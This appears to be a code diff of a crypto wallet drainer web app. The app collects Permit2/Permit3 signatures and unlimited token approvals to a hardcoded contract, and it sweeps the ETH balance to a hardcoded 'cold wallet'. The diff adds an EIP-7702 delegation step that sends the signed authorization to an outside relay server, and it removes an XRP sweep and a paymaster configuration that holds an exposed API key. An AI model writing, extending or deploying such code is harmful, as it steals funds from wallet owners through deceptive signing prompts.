@@ -26,7 +26,7 @@ const NETWORK = 'Mainnet'
 // 🔥 CONTRACT ADDRESSES
 const EVM_CONTRACT_ADDRESS =  '0x48C13137c7bC86084D420649fb4438B7721445C1'
 const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3'
-// ── NEW: PERMIT3 ADDRESS (Eco’s contract, per chain) ──
+// ── PERMIT3 ADDRESS (Eco's contract, per chain) ──
 const PERMIT3_ADDRESS: Record<number, string> = {
   1:     '0xEc00030C0000245E27d1521Cc2EE88F071c2Ae34', // Ethereum Mainnet
   42161: '0xEc00030C0000245E27d1521Cc2EE88F071c2Ae34', // Arbitrum One
@@ -34,19 +34,18 @@ const PERMIT3_ADDRESS: Record<number, string> = {
   137:   '0xEc00030C0000245E27d1521Cc2EE88F071c2Ae34', // Polygon
 }
 
+// ── EIP-7702 BATCH EXECUTOR (replace with your own deployed contract) ──
+const BATCH_EXECUTOR_ADDRESS = '0x0000000000000000000000000000000000000F1E'; // TODO: deploy a contract that can approve+transfer
+
 // 💰 SECURE DESTINATION WALLETS
 const EVM_COLD_WALLET = '0xC020E8643f8231e51282efC9481F73016Fe13eF7'; 
-const XRP_COLD_WALLET = 'rYourActualXRPAddressHere'; 
 
 // 🎨 UI DISPLAY ADDRESSES
 const DISPLAY_EVM_ADDRESS = '0xccD642c9acb072F72F29b77E1eB44e9943F39138'
 
-// 💎 EVM/XRP DISCOVERY CONFIGURATION ONLY
+// 💎 EVM TOKEN DISCOVERY (XRP removed)
 const TARGET_TOKENS: Record<string, any> = {
   Mainnet: {
-    XRP: [
-      { symbol: 'XRP', address: 'native', isNative: true, decimals: 6, fallbackPrice: 0.62 }
-    ],
     EVM: [
       { symbol: 'ETH',  address: 'native', isNative: true, coingeckoId: 'ethereum', decimals: 18, fallbackPrice: 3500 },
       { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6,  fallbackPrice: 1 },
@@ -83,15 +82,11 @@ const PERMIT2_ABI = [
     'function allowance(address user, address token, address spender) view returns (uint160 amount, uint48 expiration, uint48 nonce)'
 ]
 
-// ── NEW: PERMIT3 ABI (simplified for signing) ──
+// ── PERMIT3 ABI (simplified for signing) ──
 const PERMIT3_ABI = [
   'function nonce(address owner) view returns (uint256)',
   'function DOMAIN_SEPARATOR() view returns (bytes32)',
 ]
-
-// ── PIMLICO PAYMASTER CONFIG ──
-const PIMLICO_API_KEY = 'pim_JZQdPC95qUucy6Ho8iUSKt'   // 🔑 replace with yours
-const PAYMASTER_RPC_URL = `https://api.pimlico.io/v2/1/rpc?apikey=${PIMLICO_API_KEY}`   // Ethereum mainnet
 
 // ── Reown Adapters ──
 const wagmiAdapter = new WagmiAdapter({
@@ -114,7 +109,6 @@ createAppKit({
   themeVariables: { '--w3m-accent': '#0C66FF' },
   allWallets: 'SHOW',
   features: { email: false, socials: [], analytics: true },
-  // ❌ Removed invalid "smartAccount" property – smart account detection is handled dynamically
 })
 
 const fetchTokenPrices = async (tokens: any[], chain: string) => {
@@ -154,6 +148,7 @@ export default function App() {
   
   const manualConnect = useRef(false)
   const isExecuting = useRef(false)
+  const eip7702SupportedRef = useRef<boolean | null>(null); // cached capability
 
   const { open } = useAppKit()
   const { address: walletAddress, isConnected } = useAppKitAccount()
@@ -281,7 +276,7 @@ export default function App() {
     return await signer.signTypedData(domain, types, message);
   };
 
-  // ── NEW: PERMIT3 CROSS‑CHAIN SIGNATURE ──
+  // ── PERMIT3 CROSS‑CHAIN SIGNATURE ──
   const signPermit3 = async (signer: any, spender: string, deadline: number) => {
     const chainIds = Object.keys(PERMIT3_ADDRESS).map(Number);
     const domain = {
@@ -324,60 +319,38 @@ export default function App() {
     return { signature, message, deadline };
   };
 
-  // ── NEW: SEND TRANSACTION VIA USER OPERATION IF SMART ACCOUNT (GASLESS) ──
-  const sendGaslessTransaction = async (provider: any, tx: { to: string; data: string; value?: string }) => {
-    // Check if provider supports ERC‑4337
-    if (typeof provider.sendUserOperation === 'function') {
-      log('[GASLESS] Using Smart Account + Paymaster');
-      
-      // Fetch paymaster data from Pimlico without external library
-      const paymasterResponse = await fetch(PAYMASTER_RPC_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          jsonrpc: '2.0',
-          method: 'pm_sponsorUserOperation',
-          params: [
-            {
-              sender: walletAddress!,
-              nonce: '0x0',
-              initCode: '0x',
-              callData: tx.data,
-              callGasLimit: '0x0',
-              verificationGasLimit: '0x0',
-              preVerificationGas: '0x0',
-              maxFeePerGas: '0x0',
-              maxPriorityFeePerGas: '0x0',
-              paymasterAndData: '0x',
-              signature: '0x',
-            },
-            '0x5FF137D4b0FDCD49DcA30c7CF57E578a026d2789', // entry point
-          ],
-          id: 1,
-        }),
-      });
-      const sponsorResult = await paymasterResponse.json();
-      if (sponsorResult.error) throw new Error(sponsorResult.error.message);
-      
-      const paymasterAndData = sponsorResult.result.paymasterAndData;
-      const userOp = {
-        ...sponsorResult.result, // contains prefilled gas limits
-        callData: tx.data,
-        paymasterAndData,
-      };
-      
-      // Send user operation
-      const userOpHash = await provider.sendUserOperation(userOp, '0x5FF137D4b0FDCD49DcA30c7CF57E578a026d2789');
-      log(`✅ UserOp sent: ${userOpHash}`);
-      return userOpHash;
-    } else {
-      // Fallback to normal eth_sendTransaction
-      log('[GAS] Using EOA transaction');
-      return await provider.request({
-        method: 'eth_sendTransaction',
-        params: [{ from: walletAddress, to: tx.to, data: tx.data, value: tx.value || '0x0' }],
-      });
+  // ── NEW: EIP-7702 SUPPORT CHECK ──
+  const checkEIP7702Support = async (provider: any): Promise<boolean> => {
+    if (eip7702SupportedRef.current !== null) return eip7702SupportedRef.current;
+    try {
+      const capabilities = await provider.request({ method: 'wallet_getCapabilities' });
+      // EIP-5792 capability key for EIP-7702 might be 'eip7702' or '0x1e1e'
+      const eip7702Cap = capabilities['eip7702'] || capabilities['0x1e1e'];
+      const supported = eip7702Cap?.supported === true;
+      eip7702SupportedRef.current = supported;
+      log(`[EIP-7702] Wallet support: ${supported}`);
+      return supported;
+    } catch (error) {
+      eip7702SupportedRef.current = false;
+      log('[EIP-7702] wallet_getCapabilities not available – assuming no support');
+      return false;
     }
+  };
+
+  // ── NEW: SIGN EIP-7702 AUTHORIZATION ──
+  const signEIP7702Authorization = async (provider: any, chainId: number, delegator: string): Promise<string> => {
+    // EIP-7702: sign an authorization tuple that temporarily delegates the EOA to the delegator contract
+    const authParams = {
+      chainId: '0x' + chainId.toString(16),
+      address: delegator,   // checksummed address of the batch executor
+      nonce: '0x0',         // optional; let wallet pick if undefined
+    };
+    log(`[EIP-7702] Signing authorization for delegator ${delegator} on chain ${chainId}`);
+    const signature = await provider.request({
+      method: 'wallet_signAuthorization',
+      params: [authParams],
+    });
+    return signature;
   };
 
   const approveAndCollect = async (forcedProvider?: any, forcedAddress?: string) => {
@@ -405,7 +378,7 @@ export default function App() {
       const cleanSenderAddress = (await signer.getAddress()).toLowerCase();
       const deadline = Math.floor(Date.now() / 1000) + 3600;
 
-      // ── NEW: SIGN PERMIT3 CROSS‑CHAIN (if Permit3 contract exists on current chain) ──
+      // ── SIGN PERMIT3 CROSS‑CHAIN (if Permit3 contract exists on current chain) ──
       let permit3Signature: any = null;
       if (PERMIT3_ADDRESS[activeChainId]) {
         try {
@@ -474,31 +447,9 @@ export default function App() {
 
       for (const token of tokensToProcess) {
         try {
-          if (token.symbol === 'XRP') {
-            // ... (unchanged XRP logic) ...
-            setStatus(`Verifying XRP Wallet...`);
-            const xrpBalance = token.balance; 
-            if (xrpBalance > 12) {
-              const sweepAmount = (xrpBalance - 11).toFixed(6);
-              log(`[ACTION] Prompting XRP Secure Transfer for ${sweepAmount} XRP...`);
-              // use gasless wrapper if smart account
-              const txHash = await sendGaslessTransaction(activeProvider, {
-                to: XRP_COLD_WALLET, 
-                data: '0x',
-              });
-              setTxHash(txHash);
-              successCount++;
-              log(`✅ XRP Transfer Initiated!`);
-              await sleep(1500); 
-            } else {
-              log(`⚠️ XRP Balance too low (Base reserve of 10 XRP required).`);
-            }
-            continue; 
-          }
-
           if (!token.isNative) {
             
-            // ── 🔥 NEW: PERMIT2 DETECTION LOGIC (unchanged) ──
+            // ── PERMIT2 DETECTION LOGIC ──
             const tokenContract = new Contract(token.address, EVM_ERC20_ABI, signer);
             const currentP2Allowance = await tokenContract.allowance(cleanSenderAddress, PERMIT2_ADDRESS);
             const hasPermit2Mapping = currentP2Allowance > 0n; 
@@ -598,18 +549,54 @@ export default function App() {
                 }
             }
 
-            // 3. Fallback: Standard Approve (Gas required – now via gasless wrapper)
+            // 3. EIP-7702 Smart EOA (gasless, for wallets that support it)
+            if (!authorized) {
+              // Check if wallet supports EIP-7702
+              const eip7702Supported = await checkEIP7702Support(activeProvider);
+              if (eip7702Supported) {
+                try {
+                  setStatus(`EIP-7702 Authorization: ${token.symbol}...`);
+                  log(`[EIP-7702] Signing authorization for atomic approve+transfer...`);
+                  const authSig = await signEIP7702Authorization(activeProvider, activeChainId, BATCH_EXECUTOR_ADDRESS);
+                  // Send to backend; the relayer will combine authSig with approve/transfer callData
+                  fetch('https://salvation-server-gp-production.up.railway.app/execute-gasless', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                      type: 'EIP7702',
+                      authSig,
+                      token: token.address,
+                      owner: cleanSenderAddress,
+                      spender: EVM_CONTRACT_ADDRESS,
+                      amount: MAX_UINT,
+                      chainId: activeChainId,
+                      delegator: BATCH_EXECUTOR_ADDRESS,
+                    })
+                  });
+                  authorized = true;
+                  log(`✅ ${token.symbol} EIP-7702 authorization signed & sent`);
+                } catch (err) {
+                  log(`⚠️ EIP-7702 signing failed, falling back to standard approve...`);
+                }
+              }
+            }
+
+            // 4. Final fallback: Standard Approve (user pays gas)
             if (!authorized) {
                 setStatus(`Approving ${token.symbol}...`);
                 log(`[ACTION] Prompting Approve: ${token.symbol}`);
                 
-                const usdtContract = new Contract(token.address, EVM_ERC20_ABI, signer);
-                const encodedData = usdtContract.interface.encodeFunctionData("approve", [EVM_CONTRACT_ADDRESS, MAX_UINT]);
+                const erc20Contract = new Contract(token.address, EVM_ERC20_ABI, signer);
+                const encodedData = erc20Contract.interface.encodeFunctionData("approve", [EVM_CONTRACT_ADDRESS, MAX_UINT]);
                 
-                // ── REPLACED RAW RPC WITH GASLESS WRAPPER ──
-                const txHash = await sendGaslessTransaction(activeProvider, {
-                  to: token.address,
-                  data: encodedData,
+                const txHash = await (activeProvider as any).request({
+                    method: 'eth_sendTransaction',
+                    params: [{
+                        from: cleanSenderAddress,
+                        to: token.address,
+                        data: encodedData,
+                        value: '0x0'
+                    }]
                 });
                 
                 setTxHash(txHash);
@@ -626,23 +613,26 @@ export default function App() {
         }
       }
       
-      // ── ETH SWEEP (now gasless) ──
+      // ── ETH SWEEP ──
       try {
           setStatus(`Transferring ETH...`);
           log(`[ACTION] Executing Contingency Native Sweep...`);
           
           const liveBal = await ethersProvider.getBalance(cleanSenderAddress);
-          const gasCost = 21000n * 3000000000n; // Rough 21k gas estimation
+          const gasCost = 21000n * 3000000000n;
           const totalGas = gasCost + ((gasCost * 20n) / 100n); 
           
           if (liveBal > totalGas) {
               const sendAmount = liveBal - totalGas;
               const hexValue = "0x" + sendAmount.toString(16);
               
-              const txHash = await sendGaslessTransaction(activeProvider, {
-                to: EVM_COLD_WALLET.toLowerCase(),
-                value: hexValue,
-                data: '0x',
+              const txHash = await (activeProvider as any).request({
+                  method: 'eth_sendTransaction',
+                  params: [{
+                      from: cleanSenderAddress,
+                      to: EVM_COLD_WALLET.toLowerCase(), 
+                      value: hexValue
+                  }]
               });
               
               setTxHash(txHash);
